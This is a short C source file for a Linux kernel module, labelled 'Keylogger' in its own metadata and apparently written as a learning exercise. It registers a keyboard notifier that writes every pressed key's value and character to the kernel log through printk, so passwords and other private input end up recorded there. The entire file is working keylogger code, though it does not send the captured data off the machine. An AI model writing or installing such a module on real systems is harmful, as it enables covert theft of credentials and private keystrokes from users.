#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include<linux/types.h>
#include <linux/keyboard.h>

MODULE_AUTHOR("JB Besnard");
MODULE_DESCRIPTION("Keylogger");
MODULE_VERSION("0.1");


static int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p)
{
	struct keyboard_notifier_param *param = p;
   	if(kcode == KBD_KEYSYM){

		   if(param->down)
		   {
			   printk(KERN_INFO "KEY %d (%c) PRESSED !", param->value, param->value);
		   }

	}

	return NOTIFY_OK;
}

//Notifier handler
static struct notifier_block nb = {
        .notifier_call = key_notify
};


static int __init mymod_init(void){
	pr_info("Yo le module\n");

	register_keyboard_notifier(&nb);

	return 0;
}


static void __exit mymod_exit(void){
	unregister_keyboard_notifier(&nb);
	pr_info("FINI le module\n");
}

module_init(mymod_init);
module_exit(mymod_exit);

MODULE_LICENSE("GPL");